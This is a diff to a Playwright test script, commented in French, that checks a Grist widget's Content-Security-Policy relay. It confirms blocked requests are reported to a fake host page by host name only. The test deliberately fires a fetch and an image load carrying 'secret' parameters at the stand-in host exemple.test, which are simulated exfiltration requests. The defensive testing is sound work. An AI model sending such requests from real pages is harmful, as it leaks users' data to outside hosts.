@@ -86,6 +86,20 @@ function startServer() {
         res.end('<!doctype html><meta charset="utf-8"><body style="margin:0"><iframe id="app" sandbox="allow-scripts allow-downloads" src="/index.html" style="width:1280px;height:900px;border:0"></iframe>');
         return;
       }
+      if (pathname === '/__host.html') { // un faux GFS : une page parente qui écoute les messages de son cadre ; `?gfs=0` dans l'adresse du cadre = « GFS héberge l'app » (kit/js/host.js)
+        const query = new URL(req.url, 'http://x').searchParams;
+        const app = /^\/[A-Za-z0-9_./-]+\.html$/.test(query.get('app') || '') ? query.get('app') : '/index.html';
+        res.writeHead(200, Object.assign({ 'content-type': TYPES['.html'] }, headers));
+        res.end('<!doctype html><meta charset="utf-8"><body style="margin:0"><script>window.__messages = [];'
+          + 'addEventListener("message", function (e) { window.__messages.push({ fromApp: e.source === document.getElementById("app").contentWindow, data: e.data }); });</script>'
+          + '<iframe id="app" sandbox="allow-scripts allow-downloads" src="' + app + (query.has('gfs') ? '?gfs=' + encodeURIComponent(query.get('gfs')) : '') + '" style="width:1280px;height:900px;border:0"></iframe>');
+        return;
+      }
+      if (pathname === '/__norelay.html') { // index.html SANS la ligne du relais S8 : prouve que la vérification du relais sait échouer
+        res.writeHead(200, Object.assign({ 'content-type': TYPES['.html'] }, headers));
+        res.end(INDEX.replace('<script type="module" src="js/relais-securite.js"></script>', ''));
+        return;
+      }
       if (pathname === '/__strict.html') { // index.html SANS 'unsafe-eval' : sert à prouver que la vérification sait échouer
         res.writeHead(200, Object.assign({ 'content-type': TYPES['.html'] }, headers));
         res.end(INDEX.replace("'unsafe-eval' ", ''));
@@ -240,6 +254,52 @@ async function scenario(browser, origin, { name, url, framed }) {
   return { problems, verified, notes };
 }
 
+/**
+ * Le relais S8 (consigne GFS 026) dans la vraie page, sous sa vraie politique, dans le cadre isolé : une page parente fait le faux GFS et
+ * écoute. `hosted` = `?gfs=0` dans l'adresse du cadre. Rend ce que le parent a reçu du cadre ; l'appelant juge. Ce qui est provoqué : un
+ * `fetch` et une image vers `http://exemple.test/…?secret=…`, que `connect-src` et `img-src` refusent (`https:` n'est ouvert que pour
+ * `connect-src`, d'où `http:`) ; la requête ne sort jamais de la page, et l'adresse complète ne doit JAMAIS arriver au parent.
+ */
+async function relayScenario(browser, origin, { app, hosted, expectRelay }) {
+  const problems = [];
+  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
+  await context.addInitScript((table) => { window.__gristStubPreseed = { Ventes: table }; }, salesTable());
+  await context.route((u) => u.hostname !== '127.0.0.1', (route) => {
+    const u = new URL(route.request().url());
+    if (u.hostname === 'docs.getgrist.com' && u.pathname === '/grist-plugin-api.js') {
+      route.fulfill({ status: 200, contentType: 'text/javascript', body: gristApiBody() });
+    } else {
+      problems.push('une requête vers ' + u.hostname + ' est sortie de la page : la politique devait la bloquer');
+      route.abort();
+    }
+  });
+  const page = await context.newPage();
+  page.on('pageerror', (e) => problems.push('exception de page : ' + String(e.message || e).slice(0, 240)));
+  let messages = [];
+  try {
+    await page.goto(origin + '/__host.html?app=' + encodeURIComponent(app) + (hosted ? '&gfs=0' : ''), { waitUntil: 'load' });
+    const frame = await (await page.$('#app')).contentFrame();
+    await frame.waitForFunction(() => typeof window.GristBI === 'object' && GristBI.loader, null, { timeout: 25000 });
+    const relayed = await page.waitForFunction(
+      () => window.__messages.some((m) => m.data && m.data.nom === 'securite' && m.data.args && m.data.args.quoi === 'relais'),
+      null, { timeout: expectRelay ? 15000 : 2500 }
+    ).then(() => true, () => false);
+    if (relayed !== expectRelay) problems.push('relais « actif » ' + (relayed ? 'reçu' : 'absent') + ', attendu ' + (expectRelay ? 'reçu' : 'absent'));
+    await frame.evaluate(() => {
+      fetch('http://exemple.test/x?secret=1').catch(() => {});
+      const img = new Image();
+      img.src = 'http://exemple.test/i.png?secret=2';
+    });
+    await page.waitForTimeout(expectRelay ? 1500 : 800);
+    messages = await page.evaluate(() => window.__messages.filter((m) => m.fromApp).map((m) => m.data));
+  } catch (e) {
+    problems.push('essai interrompu : ' + String((e && e.message) || e).slice(0, 240));
+  } finally {
+    await context.close();
+  }
+  return { problems, messages };
+}
+
 (async () => {
   const server = await startServer();
   const origin = 'http://127.0.0.1:' + server.address().port;
@@ -252,13 +312,13 @@ async function scenario(browser, origin, { name, url, framed }) {
     process.exit(2);
   }
   let failed = false;
-  const report = (label, result) => {
+  const report = (label, result, options) => {
     if (result.problems.length) {
       failed = true;
       console.error('ÉCHEC : ' + label);
       for (const p of [...new Set(result.problems)]) console.error('   - ' + p);
     } else {
-      console.log('OK : ' + label + ' : ' + result.verified.join(', ') + ' ; 0 erreur, 0 violation, 0 requête hors site');
+      console.log('OK : ' + label + ' : ' + result.verified.join(', ') + (options && options.violations ? ' ; ' + options.violations + ' ; 0 requête hors site' : ' ; 0 erreur, 0 violation, 0 requête hors site'));
       const notes = [...new Set(result.notes || [])];
       if (notes.length) console.log('   remarque (pas un défaut) : ' + notes.join(' ; '));
     }
@@ -274,6 +334,23 @@ async function scenario(browser, origin, { name, url, framed }) {
   try {
     report('page directe', await scenario(browser, origin, { name: 'direct', url: '/index.html', framed: false }));
     report('cadre isolé (sandbox="allow-scripts allow-downloads")', await scenario(browser, origin, { name: 'cadre', url: '/__frame.html', framed: true }));
+
+    // Règle S8 : le relais des appels bloqués. Hébergée : « relais actif » puis, pour ce que la politique bloque, l'HÔTE seul. Seule : rien. Sans la ligne : rien.
+    const relayText = (r) => JSON.stringify(r.messages);
+    const hostedRun = await relayScenario(browser, origin, { app: '/index.html', hosted: true, expectRelay: true });
+    const blocked = hostedRun.messages.filter((m) => m.nom === 'securite' && m.args && m.args.quoi === 'bloque');
+    const connect = blocked.find((m) => m.args.directive === 'connect-src' && m.args.cible === 'exemple.test');
+    const image = blocked.find((m) => m.args.directive === 'img-src' && m.args.cible === 'exemple.test');
+    if (!connect) hostedRun.problems.push('aucun « bloqué » connect-src / exemple.test reçu : ' + relayText(hostedRun).slice(0, 400));
+    if (!image) hostedRun.problems.push('aucun « bloqué » img-src / exemple.test reçu : ' + relayText(hostedRun).slice(0, 400));
+    if (/secret|\/x\b|i\.png|http:/.test(relayText(hostedRun))) hostedRun.problems.push('le chemin, les paramètres ou l\'adresse entière sont partis : ' + relayText(hostedRun).slice(0, 400));
+    report('relais S8, hébergée par un faux GFS (`?gfs=0`, cadre isolé)', Object.assign(hostedRun, { verified: ['« relais actif » reçu', 'connect-src et img-src bloqués relayés avec « exemple.test » seul (ni chemin, ni paramètre)'] }), { violations: 'les deux appels provoqués sont bloqués' });
+    const aloneRun = await relayScenario(browser, origin, { app: '/index.html', hosted: false, expectRelay: false });
+    if (aloneRun.messages.length) aloneRun.problems.push('seule (sans `gfs=`), la page a écrit à son parent : ' + relayText(aloneRun).slice(0, 300));
+    report('relais S8, app seule', Object.assign(aloneRun, { verified: ['aucun message au parent'] }), { violations: 'bloquées sans rien dire' });
+    const noRelayRun = await relayScenario(browser, origin, { app: '/__norelay.html', hosted: true, expectRelay: false });
+    if (noRelayRun.messages.some((m) => m.nom === 'securite')) noRelayRun.problems.push('sans la ligne du relais, un message `securite` est parti : ' + relayText(noRelayRun).slice(0, 300));
+    report('contrôle négatif : sans la ligne du relais, hébergée, GFS ne reçoit rien', Object.assign(noRelayRun, { verified: ['aucun « relais actif », aucun « bloqué »'] }), { violations: 'bloquées sans rien dire' });
 
     // La vérification sait-elle échouer ? Sans 'unsafe-eval', l'API de Grist ne s'exécute pas : elle DOIT le dire.
     const strict = await scenario(browser, origin, { name: 'strict', url: '/__strict.html', framed: false });
